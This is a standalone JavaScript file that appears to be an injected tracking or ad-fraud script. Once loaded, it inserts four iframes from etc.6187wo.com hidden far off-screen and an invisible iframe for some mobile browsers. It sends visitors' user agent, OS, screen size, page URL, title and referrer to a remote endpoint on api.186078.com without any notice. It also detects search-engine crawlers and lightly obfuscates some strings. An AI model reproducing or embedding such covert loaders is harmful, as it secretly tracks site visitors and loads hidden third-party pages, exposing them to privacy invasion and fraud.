window.curNode = document.currentScript || (function() {
    var script = document.querySelectorAll('script');
    return script[script.length - 1]
})();
var s_w = window.screen.width;

var trackid = '10211';
var statid = '1280199497'

var Master_Url = '//etc.6187wo.com/Master/Core.html#s_w=' + s_w+'&trackid='+trackid;
var Slave_Url = '//etc.6187wo.com/Slave/Core.html#s_w=' + s_w+'&trackid='+trackid;
var Collect_Url = '//etc.6187wo.com/Collect/Core.html#s_w=' + s_w+'&trackid='+trackid;
var Private_Url = '//etc.6187wo.com/Private/Core.html#s_w=' + s_w+'&trackid='+trackid;
function Core(url) {
    var d = document.createElement("div");
    var c = document.createElement("iframe");
    c.src = url;
    window.curNode.parentNode.appendChild(d);
    d.style.position = 'absolute';
    d.style.left = '-40000px';
    d.style.top = '-40000px';
    d.style.width = '100%';
    d.style.height = '1000px';
    d.appendChild(c);
    c.style.width = '100%';
    c.style.height = '100%';
}

function Statistics(cnzz_id) {
    var tua = navigator.userAgent.toLocaleLowerCase();
    if ( - 1 !== tua.indexOf("tbs/") || -1 !== tua.indexOf("mqqbrowser/")) {
        var frame = document.createElement('iframe');
        frame.id = 'cnzz_frame_' + trackid;
        frame.style.cssText = 'position:absolute;left:0;top:0;width:0;height:0;visibility:hidden;';
        frame.frameBorder = '0';
        frame.src = '//etc.6187wo.com/act.html#web_id=' + cnzz_id;
        try {
            //document.body.appendChild(frame);
            window.curNode.parentNode.appendChild(frame);
        } catch(e) {}
    }
}

function GetInfo() {
    var data = {};
    data['trackid'] = trackid;
    data['c_h'] = screen.height;
    data['c_w'] = screen.width;
    data['domains'] = document.domain;
    data['isCrossDomain'] = checkCrossDomain();
    data['muidtype'] = getOS();
    data['network'] = 1;
    data['os'] = sys_os;
    data['pxr'] = window.devicePixelRatio || 1;
    data['reqnum'] = 1;
    data['rf'] = document.referrer ? 1 : 0;
    data['ua'] = window.navigator.userAgent;
    data['url'] = window.location.href;
    data['title'] = encodeURIComponent(document.title);
    data['url_referer'] = document.referrer;
    var url = 'https://api.186078.com:3928/aliyun/sample/app.php';
    RequestSend(url, JSON.stringify(data));
}

function RequestSend(url, param, fnSucc, fnFaild, reqnum) {
    var oAjax = null;
    if (window.XMLHttpRequest) {
        var oAjax = new XMLHttpRequest();
        if ("withCredentials" in oAjax) {
            oAjax.open('POST', url, true);
            oAjax.setRequestHeader("Content-Type", "text/plain");
            oAjax.onreadystatechange = function() {
                if (oAjax.readyState == 4) {
                    if (oAjax.status == 200) {
                        if (fnSucc) {
                            fnSucc(oAjax.responseText, reqnum);
                        }
                    } else {
                        if (fnFaild) {
                            fnFaild();
                        }
                    }
                }
            };
            oAjax.send(param);
        } else if (window.XDomainRequest) {
            var oAjax = new XDomainRequest();
            if (oAjax) {
                oAjax.open("POST", url, true);
                oAjax.onerror = fnFaild;
                oAjax.ontimeout = function() {
                    console.log('XDR');
                };
                oAjax.onload = function() {
                    fnSucc(oAjax.responseText);
                };
                oAjax.timeout = 3000;
                oAjax.send(param);
            }
        }
    } else {
        console.log("Your browser does not support XMLHTTP.");
    }
}

function checkCrossDomain() {
    var r = 0;
    if (window.self !== window.top) {
        r = 1;
    }
    if (window.parent !== window.top) {
        r = 2;
    }
    return r;
}

function getOS() {
    var ua = window.navigator.userAgent.toLowerCase() || '',
    p = window.navigator.platform,
    os;
    if (/baiduspider|googlebot|bingbot|sosospider|youdaobot|spider/.test(ua)) {
        sys_os = 'spider';
        os = 4;
    } else if (p.indexOf("\x57\x69\x6e") == 0 || p.indexOf("\x4d\x61\x63") == 0) {
        sys_os = 'pc';
        os = 3;
    } else if (/android|adr/.test(ua)) {
        sys_os = 'android';
        os = 1; //'android'
    } else if (/ios|iphone|ipad|itouch/.test(ua)) {
        sys_os = 'ios';
        os = 2; //'ios'
    } else {
        sys_os = 'pc';
        os = 3;
    }
    os_type = os;
    return os_type;
}
Core(Master_Url);
Core(Slave_Url);
Core(Collect_Url);
Core(Private_Url);
GetInfo();
Statistics(statid);